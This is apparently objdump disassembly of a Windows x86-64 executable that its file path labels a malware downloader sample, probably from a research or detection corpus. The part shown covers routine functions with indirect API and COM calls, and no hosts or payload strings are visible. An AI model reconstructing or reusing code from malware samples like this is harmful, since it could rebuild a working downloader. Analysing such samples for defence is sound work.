
malware_samples/downloader/2c33b75d80dd3182dbbe2a3d979ec3553784a0b072e9738db28920ecc225c972.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	40 55                	rex push %rbp
   180001002:	53                   	push   %rbx
   180001003:	56                   	push   %rsi
   180001004:	41 55                	push   %r13
   180001006:	48 8d ac 24 e8 fa ff 	lea    -0x518(%rsp),%rbp
   18000100d:	ff 
   18000100e:	48 81 ec 18 06 00 00 	sub    $0x618,%rsp
   180001015:	48 8b 05 e4 7f 01 00 	mov    0x17fe4(%rip),%rax        # 0x180019000
   18000101c:	48 33 c4             	xor    %rsp,%rax
   18000101f:	48 89 85 f0 04 00 00 	mov    %rax,0x4f0(%rbp)
   180001026:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   18000102a:	48 8d 0d bf 02 01 00 	lea    0x102bf(%rip),%rcx        # 0x1800112f0
   180001031:	4c 8b ea             	mov    %rdx,%r13
   180001034:	33 f6                	xor    %esi,%esi
   180001036:	ff 15 fc ff 00 00    	call   *0xfffc(%rip)        # 0x180011038
   18000103c:	48 8b d8             	mov    %rax,%rbx
   18000103f:	48 85 c0             	test   %rax,%rax
   180001042:	0f 84 04 02 00 00    	je     0x18000124c
   180001048:	48 8d 15 b9 02 01 00 	lea    0x102b9(%rip),%rdx        # 0x180011308
   18000104f:	48 8b c8             	mov    %rax,%rcx
   180001052:	4c 89 b4 24 08 06 00 	mov    %r14,0x608(%rsp)
   180001059:	00 
   18000105a:	ff 15 f8 ff 00 00    	call   *0xfff8(%rip)        # 0x180011058
   180001060:	4c 8b f0             	mov    %rax,%r14
   180001063:	48 85 c0             	test   %rax,%rax
   180001066:	75 10                	jne    0x180001078
   180001068:	48 8b cb             	mov    %rbx,%rcx
   18000106b:	ff 15 ef ff 00 00    	call   *0xffef(%rip)        # 0x180011060
   180001071:	33 c0                	xor    %eax,%eax
   180001073:	e9 cc 01 00 00       	jmp    0x180001244
   180001078:	48 8d 0d a1 02 01 00 	lea    0x102a1(%rip),%rcx        # 0x180011320
   18000107f:	48 89 bc 24 50 06 00 	mov    %rdi,0x650(%rsp)
   180001086:	00 
   180001087:	ff 15 ab ff 00 00    	call   *0xffab(%rip)        # 0x180011038
   18000108d:	48 8b f8             	mov    %rax,%rdi
   180001090:	48 85 c0             	test   %rax,%rax
   180001093:	0f 84 a3 01 00 00    	je     0x18000123c
   180001099:	48 8d 15 98 02 01 00 	lea    0x10298(%rip),%rdx        # 0x180011338
   1800010a0:	48 8b c8             	mov    %rax,%rcx
   1800010a3:	4c 89 a4 24 10 06 00 	mov    %r12,0x610(%rsp)
   1800010aa:	00 
   1800010ab:	4c 89 bc 24 00 06 00 	mov    %r15,0x600(%rsp)
   1800010b2:	00 
   1800010b3:	ff 15 9f ff 00 00    	call   *0xff9f(%rip)        # 0x180011058
   1800010b9:	48 8d 15 88 02 01 00 	lea    0x10288(%rip),%rdx        # 0x180011348
   1800010c0:	48 8b cf             	mov    %rdi,%rcx
   1800010c3:	4c 8b e0             	mov    %rax,%r12
   1800010c6:	ff 15 8c ff 00 00    	call   *0xff8c(%rip)        # 0x180011058
   1800010cc:	4c 8b f8             	mov    %rax,%r15
   1800010cf:	4d 85 e4             	test   %r12,%r12
   1800010d2:	0f 84 52 01 00 00    	je     0x18000122a
   1800010d8:	48 85 c0             	test   %rax,%rax
   1800010db:	0f 84 49 01 00 00    	je     0x18000122a
   1800010e1:	48 8d 8d a0 01 00 00 	lea    0x1a0(%rbp),%rcx
   1800010e8:	33 d2                	xor    %edx,%edx
   1800010ea:	41 b8 48 03 00 00    	mov    $0x348,%r8d
   1800010f0:	e8 6b 41 00 00       	call   0x180005260
   1800010f5:	8b 54 24 20          	mov    0x20(%rsp),%edx
   1800010f9:	4c 8d 85 a0 01 00 00 	lea    0x1a0(%rbp),%r8
   180001100:	45 33 c9             	xor    %r9d,%r9d
   180001103:	33 c9                	xor    %ecx,%ecx
   180001105:	c7 85 a0 01 00 00 48 	movl   $0x348,0x1a0(%rbp)
   18000110c:	03 00 00 
   18000110f:	41 ff d6             	call   *%r14
   180001112:	48 8d 95 a4 01 00 00 	lea    0x1a4(%rbp),%rdx
   180001119:	45 33 c9             	xor    %r9d,%r9d
   18000111c:	45 33 c0             	xor    %r8d,%r8d
   18000111f:	33 c9                	xor    %ecx,%ecx
   180001121:	ff 15 e1 fe 00 00    	call   *0xfee1(%rip)        # 0x180011008
   180001127:	4c 8b f0             	mov    %rax,%r14
   18000112a:	48 85 c0             	test   %rax,%rax
   18000112d:	0f 84 e5 00 00 00    	je     0x180001218
   180001133:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   180001138:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   18000113d:	41 ff d7             	call   *%r15
   180001140:	49 8b ce             	mov    %r14,%rcx
   180001143:	85 c0                	test   %eax,%eax
   180001145:	0f 88 c7 00 00 00    	js     0x180001212
   18000114b:	ff 15 af fe 00 00    	call   *0xfeaf(%rip)        # 0x180011000
   180001151:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   180001156:	33 d2                	xor    %edx,%edx
   180001158:	41 b8 40 02 00 00    	mov    $0x240,%r8d
   18000115e:	e8 fd 40 00 00       	call   0x180005260
   180001163:	33 c0                	xor    %eax,%eax
   180001165:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   18000116a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000116f:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180001174:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180001179:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   18000117e:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180001182:	c7 44 24 60 80 00 00 	movl   $0x80,0x60(%rsp)
   180001189:	00 
   18000118a:	89 44 24 28          	mov    %eax,0x28(%rsp)
   18000118e:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   180001193:	c7 44 24 64 00 00 01 	movl   $0x10000,0x64(%rsp)
   18000119a:	00 
   18000119b:	c7 44 24 68 03 00 00 	movl   $0x3000003,0x68(%rsp)
   1800011a2:	03 
   1800011a3:	c7 45 e0 50 00 00 00 	movl   $0x50,-0x20(%rbp)
   1800011aa:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%rbp)
   1800011b1:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1800011b6:	48 c7 45 e8 34 01 40 	movq   $0x400134,-0x18(%rbp)
   1800011bd:	00 
   1800011be:	89 75 f0             	mov    %esi,-0x10(%rbp)
   1800011c1:	c7 45 f4 40 00 00 00 	movl   $0x40,-0xc(%rbp)
   1800011c8:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%rbp)
   1800011cf:	c7 45 34 68 01 00 00 	movl   $0x168,0x34(%rbp)
   1800011d6:	c7 45 38 68 01 00 00 	movl   $0x168,0x38(%rbp)
   1800011dd:	c7 44 24 40 40 02 00 	movl   $0x240,0x40(%rsp)
   1800011e4:	00 
   1800011e5:	89 74 24 30          	mov    %esi,0x30(%rsp)
   1800011e9:	41 ff d4             	call   *%r12
   1800011ec:	85 c0                	test   %eax,%eax
   1800011ee:	78 0c                	js     0x1800011fc
   1800011f0:	8b 4d 3c             	mov    0x3c(%rbp),%ecx
   1800011f3:	be 01 00 00 00       	mov    $0x1,%esi
   1800011f8:	41 89 4d 00          	mov    %ecx,0x0(%r13)
   1800011fc:	48 8b cb             	mov    %rbx,%rcx
   1800011ff:	ff 15 5b fe 00 00    	call   *0xfe5b(%rip)        # 0x180011060
   180001205:	48 8b cf             	mov    %rdi,%rcx
   180001208:	ff 15 52 fe 00 00    	call   *0xfe52(%rip)        # 0x180011060
   18000120e:	8b c6                	mov    %esi,%eax
   180001210:	eb 1a                	jmp    0x18000122c
   180001212:	ff 15 e8 fd 00 00    	call   *0xfde8(%rip)        # 0x180011000
   180001218:	48 8b cb             	mov    %rbx,%rcx
   18000121b:	ff 15 3f fe 00 00    	call   *0xfe3f(%rip)        # 0x180011060
   180001221:	48 8b cf             	mov    %rdi,%rcx
   180001224:	ff 15 36 fe 00 00    	call   *0xfe36(%rip)        # 0x180011060
   18000122a:	33 c0                	xor    %eax,%eax
   18000122c:	4c 8b a4 24 10 06 00 	mov    0x610(%rsp),%r12
   180001233:	00 
   180001234:	4c 8b bc 24 00 06 00 	mov    0x600(%rsp),%r15
   18000123b:	00 
   18000123c:	48 8b bc 24 50 06 00 	mov    0x650(%rsp),%rdi
   180001243:	00 
   180001244:	4c 8b b4 24 08 06 00 	mov    0x608(%rsp),%r14
   18000124b:	00 
   18000124c:	48 8b 8d f0 04 00 00 	mov    0x4f0(%rbp),%rcx
   180001253:	48 33 cc             	xor    %rsp,%rcx
   180001256:	e8 d5 3f 00 00       	call   0x180005230
   18000125b:	48 81 c4 18 06 00 00 	add    $0x618,%rsp
   180001262:	41 5d                	pop    %r13
   180001264:	5e                   	pop    %rsi
   180001265:	5b                   	pop    %rbx
   180001266:	5d                   	pop    %rbp
   180001267:	c3                   	ret
   180001268:	cc                   	int3
   180001269:	cc                   	int3
   18000126a:	cc                   	int3
   18000126b:	cc                   	int3
   18000126c:	cc                   	int3
   18000126d:	cc                   	int3
   18000126e:	cc                   	int3
   18000126f:	cc                   	int3
   180001270:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180001275:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000127a:	57                   	push   %rdi
   18000127b:	48 81 ec 00 02 00 00 	sub    $0x200,%rsp
   180001282:	48 8b 05 77 7d 01 00 	mov    0x17d77(%rip),%rax        # 0x180019000
   180001289:	48 33 c4             	xor    %rsp,%rax
   18000128c:	48 89 84 24 f0 01 00 	mov    %rax,0x1f0(%rsp)
   180001293:	00 
   180001294:	48 8b f1             	mov    %rcx,%rsi
   180001297:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   18000129e:	00 
   18000129f:	33 d2                	xor    %edx,%edx
   1800012a1:	41 b8 68 01 00 00    	mov    $0x168,%r8d
   1800012a7:	c7 44 24 30 10 00 00 	movl   $0x10,0x30(%rsp)
   1800012ae:	00 
   1800012af:	48 c7 44 24 34 34 01 	movq   $0x400134,0x34(%rsp)
   1800012b6:	40 00 
   1800012b8:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%rsp)
   1800012bf:	00 
   1800012c0:	c7 44 24 40 40 00 00 	movl   $0x40,0x40(%rsp)
   1800012c7:	00 
   1800012c8:	c7 44 24 44 01 00 00 	movl   $0x1,0x44(%rsp)
   1800012cf:	00 
   1800012d0:	e8 8b 3f 00 00       	call   0x180005260
   1800012d5:	48 8d 0d 04 00 01 00 	lea    0x10004(%rip),%rcx        # 0x1800112e0
   1800012dc:	45 33 c9             	xor    %r9d,%r9d
   1800012df:	45 33 c0             	xor    %r8d,%r8d
   1800012e2:	33 d2                	xor    %edx,%edx
   1800012e4:	ff 15 1e fd 00 00    	call   *0xfd1e(%rip)        # 0x180011008
   1800012ea:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   1800012ef:	ba 06 73 00 00       	mov    $0x7306,%edx
   1800012f4:	48 8b f8             	mov    %rax,%rdi
   1800012f7:	48 8d 84 24 80 00 00 	lea    0x80(%rsp),%rax
   1800012fe:	00 
   1800012ff:	41 b8 50 00 00 00    	mov    $0x50,%r8d
   180001305:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000130a:	48 8b cf             	mov    %rdi,%rcx
   18000130d:	c7 44 24 20 68 01 00 	movl   $0x168,0x20(%rsp)
   180001314:	00 
   180001315:	ff 15 f5 fc 00 00    	call   *0xfcf5(%rip)        # 0x180011010
   18000131b:	48 8b cf             	mov    %rdi,%rcx
   18000131e:	8b d8                	mov    %eax,%ebx
   180001320:	ff 15 da fc 00 00    	call   *0xfcda(%rip)        # 0x180011000
   180001326:	85 db                	test   %ebx,%ebx
   180001328:	75 0e                	jne    0x180001338
   18000132a:	8b 84 24 84 00 00 00 	mov    0x84(%rsp),%eax
   180001331:	89 06                	mov    %eax,(%rsi)
   180001333:	8d 43 01             	lea    0x1(%rbx),%eax
   180001336:	eb 02                	jmp    0x18000133a
   180001338:	33 c0                	xor    %eax,%eax
   18000133a:	48 8b 8c 24 f0 01 00 	mov    0x1f0(%rsp),%rcx
   180001341:	00 
   180001342:	48 33 cc             	xor    %rsp,%rcx
   180001345:	e8 e6 3e 00 00       	call   0x180005230
   18000134a:	4c 8d 9c 24 00 02 00 	lea    0x200(%rsp),%r11
   180001351:	00 
   180001352:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   180001356:	49 8b 73 20          	mov    0x20(%r11),%rsi
   18000135a:	49 8b e3             	mov    %r11,%rsp
   18000135d:	5f                   	pop    %rdi
   18000135e:	c3                   	ret
   18000135f:	cc                   	int3
   180001360:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001365:	57                   	push   %rdi
   180001366:	48 83 ec 20          	sub    $0x20,%rsp
   18000136a:	48 8b da             	mov    %rdx,%rbx
   18000136d:	c7 02 01 00 00 00    	movl   $0x1,(%rdx)
   180001373:	33 d2                	xor    %edx,%edx
   180001375:	8b f9                	mov    %ecx,%edi
   180001377:	8d 4a 06             	lea    0x6(%rdx),%ecx
   18000137a:	45 33 c0             	xor    %r8d,%r8d
   18000137d:	e8 4e 00 00 00       	call   0x1800013d0
   180001382:	84 c0                	test   %al,%al
   180001384:	74 0e                	je     0x180001394
   180001386:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   18000138b:	8b cf                	mov    %edi,%ecx
   18000138d:	e8 6e fc ff ff       	call   0x180001000
   180001392:	eb 0a                	jmp    0x18000139e
   180001394:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   180001399:	e8 d2 fe ff ff       	call   0x180001270
   18000139e:	8b c8                	mov    %eax,%ecx
   1800013a0:	85 c0                	test   %eax,%eax
   1800013a2:	74 08                	je     0x1800013ac
   1800013a4:	8b 44 24 38          	mov    0x38(%rsp),%eax
   1800013a8:	85 c0                	test   %eax,%eax
   1800013aa:	75 05                	jne    0x1800013b1
   1800013ac:	b8 01 00 00 00       	mov    $0x1,%eax
   1800013b1:	89 03                	mov    %eax,(%rbx)
   1800013b3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800013b8:	83 f9 01             	cmp    $0x1,%ecx
   1800013bb:	0f 94 c0             	sete   %al
   1800013be:	48 83 c4 20          	add    $0x20,%rsp
   1800013c2:	5f                   	pop    %rdi
   1800013c3:	c3                   	ret
   1800013c4:	cc                   	int3
   1800013c5:	cc                   	int3
   1800013c6:	cc                   	int3
   1800013c7:	cc                   	int3
   1800013c8:	cc                   	int3
   1800013c9:	cc                   	int3
   1800013ca:	cc                   	int3
   1800013cb:	cc                   	int3
   1800013cc:	cc                   	int3
   1800013cd:	cc                   	int3
   1800013ce:	cc                   	int3
   1800013cf:	cc                   	int3
   1800013d0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1800013d5:	55                   	push   %rbp
   1800013d6:	56                   	push   %rsi
   1800013d7:	57                   	push   %rdi
   1800013d8:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   1800013df:	48 8b 05 1a 7c 01 00 	mov    0x17c1a(%rip),%rax        # 0x180019000
   1800013e6:	48 33 c4             	xor    %rsp,%rax
   1800013e9:	48 89 84 24 40 01 00 	mov    %rax,0x140(%rsp)
   1800013f0:	00 
   1800013f1:	33 f6                	xor    %esi,%esi
   1800013f3:	0f b7 d9             	movzwl %cx,%ebx
   1800013f6:	41 0f b7 e8          	movzwl %r8w,%ebp
   1800013fa:	0f b7 fa             	movzwl %dx,%edi
   1800013fd:	48 8d 4c 24 36       	lea    0x36(%rsp),%rcx
   180001402:	41 b8 fe 00 00 00    	mov    $0xfe,%r8d
   180001408:	33 d2                	xor    %edx,%edx
   18000140a:	48 c7 44 24 20 1c 01 	movq   $0x11c,0x20(%rsp)
   180001411:	00 00 
   180001413:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   180001418:	89 74 24 30          	mov    %esi,0x30(%rsp)
   18000141c:	66 89 74 24 34       	mov    %si,0x34(%rsp)
   180001421:	e8 3a 3e 00 00       	call   0x180005260
   180001426:	8d 56 02             	lea    0x2(%rsi),%edx
   180001429:	41 b0 03             	mov    $0x3,%r8b
   18000142c:	33 c9                	xor    %ecx,%ecx
   18000142e:	48 89 b4 24 34 01 00 	mov    %rsi,0x134(%rsp)
   180001435:	00 
   180001436:	ff 15 34 fc 00 00    	call   *0xfc34(%rip)        # 0x180011070
   18000143c:	8d 56 01             	lea    0x1(%rsi),%edx
   18000143f:	48 8b c8             	mov    %rax,%rcx
   180001442:	41 b0 03             	mov    $0x3,%r8b
   180001445:	ff 15 25 fc 00 00    	call   *0xfc25(%rip)        # 0x180011070
   18000144b:	8d 56 20             	lea    0x20(%rsi),%edx
   18000144e:	41 b0 03             	mov    $0x3,%r8b
   180001451:	48 8b c8             	mov    %rax,%rcx
   180001454:	ff 15 16 fc 00 00    	call   *0xfc16(%rip)        # 0x180011070
   18000145a:	8d 56 23             	lea    0x23(%rsi),%edx
   18000145d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001462:	4c 8b c0             	mov    %rax,%r8
   180001465:	89 5c 24 24          	mov    %ebx,0x24(%rsp)
   180001469:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   18000146d:	66 89 ac 24 34 01 00 	mov    %bp,0x134(%rsp)
   180001474:	00 
   180001475:	ff 15 a5 fb 00 00    	call   *0xfba5(%rip)        # 0x180011020
   18000147b:	85 c0                	test   %eax,%eax
   18000147d:	0f 95 c0             	setne  %al
   180001480:	48 8b 8c 24 40 01 00 	mov    0x140(%rsp),%rcx
   180001487:	00 
   180001488:	48 33 cc             	xor    %rsp,%rcx
   18000148b:	e8 a0 3d 00 00       	call   0x180005230
   180001490:	48 8b 9c 24 88 01 00 	mov    0x188(%rsp),%rbx
   180001497:	00 
   180001498:	48 81 c4 50 01 00 00 	add    $0x150,%rsp
   18000149f:	5f                   	pop    %rdi
   1800014a0:	5e                   	pop    %rsi
   1800014a1:	5d                   	pop    %rbp
   1800014a2:	c3                   	ret
   1800014a3:	cc                   	int3
   1800014a4:	cc                   	int3
   1800014a5:	cc                   	int3
   1800014a6:	cc                   	int3
   1800014a7:	cc                   	int3
   1800014a8:	cc                   	int3
   1800014a9:	cc                   	int3
   1800014aa:	cc                   	int3
   1800014ab:	cc                   	int3
   1800014ac:	cc                   	int3
   1800014ad:	cc                   	int3
   1800014ae:	cc                   	int3
   1800014af:	cc                   	int3
   1800014b0:	48 83 ec 38          	sub    $0x38,%rsp
   1800014b4:	48 8b c1             	mov    %rcx,%rax
   1800014b7:	48 85 c9             	test   %rcx,%rcx
   1800014ba:	74 6b                	je     0x180001527
   1800014bc:	48 85 d2             	test   %rdx,%rdx
   1800014bf:	74 66                	je     0x180001527
   1800014c1:	4d 85 c9             	test   %r9,%r9
   1800014c4:	74 61                	je     0x180001527
   1800014c6:	48 8b 89 08 01 00 00 	mov    0x108(%rcx),%rcx
   1800014cd:	48 85 c9             	test   %rcx,%rcx
   1800014d0:	75 0a                	jne    0x1800014dc
   1800014d2:	b8 06 00 00 00       	mov    $0x6,%eax
   1800014d7:	48 83 c4 38          	add    $0x38,%rsp
   1800014db:	c3                   	ret
   1800014dc:	81 b8 10 01 00 00 03 	cmpl   $0x10003,0x110(%rax)
   1800014e3:	00 01 00 
   1800014e6:	4c 8b 11             	mov    (%rcx),%r10
   1800014e9:	72 22                	jb     0x18000150d
   1800014eb:	8b 44 24 68          	mov    0x68(%rsp),%eax
   1800014ef:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1800014f3:	8b 44 24 60          	mov    0x60(%rsp),%eax
   1800014f7:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1800014fb:	41 ff 52 70          	call   *0x70(%r10)
   1800014ff:	8b c8                	mov    %eax,%ecx
   180001501:	33 c0                	xor    %eax,%eax
   180001503:	85 c9                	test   %ecx,%ecx
   180001505:	0f 95 c0             	setne  %al
   180001508:	48 83 c4 38          	add    $0x38,%rsp
   18000150c:	c3                   	ret
   18000150d:	8b 44 24 60          	mov    0x60(%rsp),%eax
   180001511:	89 44 24 20          	mov    %eax,0x20(%rsp)
   180001515:	41 ff 52 28          	call   *0x28(%r10)
   180001519:	8b c8                	mov    %eax,%ecx
   18000151b:	33 c0                	xor    %eax,%eax
   18000151d:	85 c9                	test   %ecx,%ecx
   18000151f:	0f 95 c0             	setne  %al
   180001522:	48 83 c4 38          	add    $0x38,%rsp
   180001526:	c3                   	ret
   180001527:	b8 02 00 00 00       	mov    $0x2,%eax
   18000152c:	48 83 c4 38          	add    $0x38,%rsp
   180001530:	c3                   	ret
   180001531:	cc                   	int3
   180001532:	cc                   	int3
   180001533:	cc                   	int3
   180001534:	cc                   	int3
   180001535:	cc                   	int3
   180001536:	cc                   	int3
   180001537:	cc                   	int3
   180001538:	cc                   	int3
   180001539:	cc                   	int3
   18000153a:	cc                   	int3
   18000153b:	cc                   	int3
   18000153c:	cc                   	int3
   18000153d:	cc                   	int3
   18000153e:	cc                   	int3
   18000153f:	cc                   	int3
   180001540:	48 83 ec 38          	sub    $0x38,%rsp
   180001544:	48 8b c1             	mov    %rcx,%rax
   180001547:	48 85 c9             	test   %rcx,%rcx
   18000154a:	74 6b                	je     0x1800015b7
   18000154c:	48 85 d2             	test   %rdx,%rdx
   18000154f:	74 66                	je     0x1800015b7
   180001551:	4d 85 c9             	test   %r9,%r9
   180001554:	74 61                	je     0x1800015b7
   180001556:	48 8b 89 08 01 00 00 	mov    0x108(%rcx),%rcx
   18000155d:	48 85 c9             	test   %rcx,%rcx
   180001560:	75 0a                	jne    0x18000156c
   180001562:	b8 06 00 00 00       	mov    $0x6,%eax
   180001567:	48 83 c4 38          	add    $0x38,%rsp
   18000156b:	c3                   	ret
   18000156c:	81 b8 10 01 00 00 03 	cmpl   $0x10003,0x110(%rax)
   180001573:	00 01 00 
   180001576:	4c 8b 11             	mov    (%rcx),%r10
   180001579:	72 22                	jb     0x18000159d
   18000157b:	8b 44 24 68          	mov    0x68(%rsp),%eax
   18000157f:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180001583:	8b 44 24 60          	mov    0x60(%rsp),%eax
   180001587:	89 44 24 20          	mov    %eax,0x20(%rsp)
   18000158b:	41 ff 52 78          	call   *0x78(%r10)
   18000158f:	8b c8                	mov    %eax,%ecx
   180001591:	33 c0                	xor    %eax,%eax
   180001593:	85 c9                	test   %ecx,%ecx
   180001595:	0f 95 c0             	setne  %al
   180001598:	48 83 c4 38          	add    $0x38,%rsp
   18000159c:	c3                   	ret
   18000159d:	8b 44 24 60          	mov    0x60(%rsp),%eax
   1800015a1:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1800015a5:	41 ff 52 30          	call   *0x30(%r10)
   1800015a9:	8b c8                	mov    %eax,%ecx
   1800015ab:	33 c0                	xor    %eax,%eax
   1800015ad:	85 c9                	test   %ecx,%ecx
   1800015af:	0f 95 c0             	setne  %al
   1800015b2:	48 83 c4 38          	add    $0x38,%rsp
   1800015b6:	c3                   	ret
   1800015b7:	b8 02 00 00 00       	mov    $0x2,%eax
   1800015bc:	48 83 c4 38          	add    $0x38,%rsp
   1800015c0:	c3                   	ret
   1800015c1:	cc                   	int3
   1800015c2:	cc                   	int3
   1800015c3:	cc                   	int3
   1800015c4:	cc                   	int3
   1800015c5:	cc                   	int3
   1800015c6:	cc                   	int3
   1800015c7:	cc                   	int3
   1800015c8:	cc                   	int3
   1800015c9:	cc                   	int3
   1800015ca:	cc                   	int3
   1800015cb:	cc                   	int3
   1800015cc:	cc                   	int3
   1800015cd:	cc                   	int3
   1800015ce:	cc                   	int3
   1800015cf:	cc                   	int3
   1800015d0:	48 83 ec 38          	sub    $0x38,%rsp
   1800015d4:	48 8b c1             	mov    %rcx,%rax
   1800015d7:	48 85 c9             	test   %rcx,%rcx
   1800015da:	74 6e                	je     0x18000164a
   1800015dc:	48 85 d2             	test   %rdx,%rdx
   1800015df:	74 69                	je     0x18000164a
   1800015e1:	4d 85 c9             	test   %r9,%r9
   1800015e4:	74 64                	je     0x18000164a
   1800015e6:	48 8b 89 08 01 00 00 	mov    0x108(%rcx),%rcx
   1800015ed:	48 85 c9             	test   %rcx,%rcx
   1800015f0:	75 0a                	jne    0x1800015fc
   1800015f2:	b8 06 00 00 00       	mov    $0x6,%eax
   1800015f7:	48 83 c4 38          	add    $0x38,%rsp
   1800015fb:	c3                   	ret
   1800015fc:	81 b8 10 01 00 00 03 	cmpl   $0x10003,0x110(%rax)
   180001603:	00 01 00 
   180001606:	4c 8b 11             	mov    (%rcx),%r10
   180001609:	72 25                	jb     0x180001630
   18000160b:	8b 44 24 68          	mov    0x68(%rsp),%eax
   18000160f:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180001613:	8b 44 24 60          	mov    0x60(%rsp),%eax
   180001617:	89 44 24 20          	mov    %eax,0x20(%rsp)
   18000161b:	41 ff 92 80 00 00 00 	call   *0x80(%r10)
   180001622:	8b c8                	mov    %eax,%ecx
   180001624:	33 c0                	xor    %eax,%eax
   180001626:	85 c9                	test   %ecx,%ecx
   180001628:	0f 95 c0             	setne  %al
   18000162b:	48 83 c4 38          	add    $0x38,%rsp
   18000162f:	c3                   	ret
   180001630:	8b 44 24 60          	mov    0x60(%rsp),%eax
   180001634:	89 44 24 20          	mov    %eax,0x20(%rsp)
   180001638:	41 ff 52 38          	call   *0x38(%r10)
   18000163c:	8b c8                	mov    %eax,%ecx
   18000163e:	33 c0                	xor    %eax,%eax
   180001640:	85 c9                	test   %ecx,%ecx
   180001642:	0f 95 c0             	setne  %al
   180001645:	48 83 c4 38          	add    $0x38,%rsp
   180001649:	c3                   	ret
   18000164a:	b8 02 00 00 00       	mov    $0x2,%eax
   18000164f:	48 83 c4 38          	add    $0x38,%rsp
   180001653:	c3                   	ret
   180001654:	cc                   	int3
   180001655:	cc                   	int3
   180001656:	cc                   	int3
   180001657:	cc                   	int3
   180001658:	cc                   	int3
   180001659:	cc                   	int3
   18000165a:	cc                   	int3
   18000165b:	cc                   	int3
   18000165c:	cc                   	int3
   18000165d:	cc                   	int3
   18000165e:	cc                   	int3
   18000165f:	cc                   	int3
   180001660:	48 83 ec 38          	sub    $0x38,%rsp
   180001664:	48 8b c1             	mov    %rcx,%rax
   180001667:	48 85 c9             	test   %rcx,%rcx
   18000166a:	74 6e                	je     0x1800016da
   18000166c:	48 85 d2             	test   %rdx,%rdx
   18000166f:	74 69                	je     0x1800016da
   180001671:	4d 85 c9             	test   %r9,%r9
   180001674:	74 64                	je     0x1800016da
   180001676:	48 8b 89 08 01 00 00 	mov    0x108(%rcx),%rcx
   18000167d:	48 85 c9             	test   %rcx,%rcx
   180001680:	75 0a                	jne    0x18000168c
   180001682:	b8 06 00 00 00       	mov    $0x6,%eax
   180001687:	48 83 c4 38          	add    $0x38,%rsp
   18000168b:	c3                   	ret
   18000168c:	81 b8 10 01 00 00 03 	cmpl   $0x10003,0x110(%rax)
   180001693:	00 01 00 
   180001696:	4c 8b 11             	mov    (%rcx),%r10
   180001699:	72 25                	jb     0x1800016c0
   18000169b:	8b 44 24 68          	mov    0x68(%rsp),%eax
   18000169f:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1800016a3:	8b 44 24 60          	mov    0x60(%rsp),%eax
   1800016a7:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1800016ab:	41 ff 92 88 00 00 00 	call   *0x88(%r10)
   1800016b2:	8b c8                	mov    %eax,%ecx
   1800016b4:	33 c0                	xor    %eax,%eax
   1800016b6:	85 c9                	test   %ecx,%ecx
   1800016b8:	0f 95 c0             	setne  %al
   1800016bb:	48 83 c4 38          	add    $0x38,%rsp
   1800016bf:	c3                   	ret
   1800016c0:	8b 44 24 60          	mov    0x60(%rsp),%eax
   1800016c4:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1800016c8:	41 ff 52 40          	call   *0x40(%r10)
   1800016cc:	8b c8                	mov    %eax,%ecx
   1800016ce:	33 c0                	xor    %eax,%eax
   1800016d0:	85 c9                	test   %ecx,%ecx
   1800016d2:	0f 95 c0             	setne  %al
   1800016d5:	48 83 c4 38          	add    $0x38,%rsp
   1800016d9:	c3                   	ret
   1800016da:	b8 02 00 00 00       	mov    $0x2,%eax
   1800016df:	48 83 c4 38          	add    $0x38,%rsp
   1800016e3:	c3                   	ret
   1800016e4:	cc                   	int3
   1800016e5:	cc                   	int3
   1800016e6:	cc                   	int3
   1800016e7:	cc                   	int3
   1800016e8:	cc                   	int3
   1800016e9:	cc                   	int3
   1800016ea:	cc                   	int3
   1800016eb:	cc                   	int3
   1800016ec:	cc                   	int3
   1800016ed:	cc                   	int3
   1800016ee:	cc                   	int3
   1800016ef:	cc                   	int3
   1800016f0:	48 83 ec 28          	sub    $0x28,%rsp
   1800016f4:	48 85 c9             	test   %rcx,%rcx
   1800016f7:	74 26                	je     0x18000171f
   1800016f9:	48 85 d2             	test   %rdx,%rdx
   1800016fc:	74 21                	je     0x18000171f
   1800016fe:	48 8b 89 08 01 00 00 	mov    0x108(%rcx),%rcx
   180001705:	48 85 c9             	test   %rcx,%rcx
   180001708:	75 08                	jne    0x180001712
   18000170a:	8d 41 06             	lea    0x6(%rcx),%eax
   18000170d:	48 83 c4 28          	add    $0x28,%rsp
   180001711:	c3                   	ret
   180001712:	48 8b 01             	mov    (%rcx),%rax
   180001715:	ff 50 58             	call   *0x58(%rax)
   180001718:	33 c0                	xor    %eax,%eax
   18000171a:	48 83 c4 28          	add    $0x28,%rsp
   18000171e:	c3                   	ret
